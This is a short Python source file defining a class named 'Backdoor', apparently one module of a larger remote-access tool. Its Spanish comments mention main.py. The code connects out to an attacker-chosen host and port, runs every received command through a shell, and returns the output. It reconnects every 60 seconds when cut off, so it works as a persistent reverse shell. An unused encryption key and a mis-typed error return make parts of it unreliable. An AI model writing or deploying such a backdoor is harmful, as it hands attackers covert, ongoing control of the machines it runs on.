import socket
import subprocess
import os
from cryptography.fernet import Fernet

class Backdoor:  # Clase renombrada para coincidir con lo que main.py espera
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)

    def execute(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return output.decode()
        except Exception as e:
            return str(e).encode()

    def run(self):
        while True:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.connect((self.host, self.port))
                    while True:
                        command = s.recv(1024).decode()
                        if not command:
                            break
                        if command.lower() == 'exit':
                            return
                        output = self.execute(command)
                        s.send(output.encode())
            except Exception:
                import time
                time.sleep(60)  # Reintentar cada 60 segundos
